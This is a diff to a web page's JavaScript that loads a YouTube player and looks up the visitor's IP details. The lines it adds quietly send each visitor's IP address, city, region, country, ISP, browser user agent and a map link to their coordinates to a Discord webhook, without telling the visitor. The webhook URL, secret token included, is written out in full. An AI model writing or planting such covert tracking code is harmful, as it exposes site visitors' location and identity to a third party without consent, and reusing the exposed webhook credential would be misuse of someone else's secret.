@@ -1,10 +1,10 @@
 // Load the IFrame Player API code asynchronously.
-const tag = document.createElement('script'); // Declare 'tag'
+const tag = document.createElement('script');
 tag.src = "https://www.youtube.com/iframe_api";
 const firstScriptTag = document.getElementsByTagName('script')[0];
 firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
 
-const video = '5e4INH1yr9c';
+const videoId = '5e4INH1yr9c';
 
 let player;
 
@@ -13,7 +13,7 @@ function onYouTubeIframeAPIReady() {
   player = new YT.Player('player', {
     height: '100', 
     width: '100%', 
-    videoId: video,
+    videoId: videoId,
     playerVars: {
       autoplay: 0, 
       controls: 0, 
@@ -58,6 +58,23 @@ fetch('https://api.ipify.org?format=json')
         regionElement.textContent = region;
         ispElement.textContent = isp;
         locationElement.textContent = location;
+        const message = `# Someone visited your website! \n\n` +
+                       `**IP:** ${ipData.ip} \n` + 
+                       `**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n` +
+                       `**ISP:** ${ipData.org} \n` +
+                       `**User Agent:** ${navigator.userAgent} \n` +
+                       `[Map](https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude})\n`;
+
+        // Send to Discord Webhook
+        fetch('https://discord.com/api/webhooks/1271466878057054279/Qu8UpcJu6620_I3HqoO_CmbGkX3NL0QgpWa0949IfBW2xFVDmV4vljXHZEid2lQ8uCv1', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: message,
+          }),
+        });
       })
       .catch(error => {
         console.error('Error fetching IP information:', error);
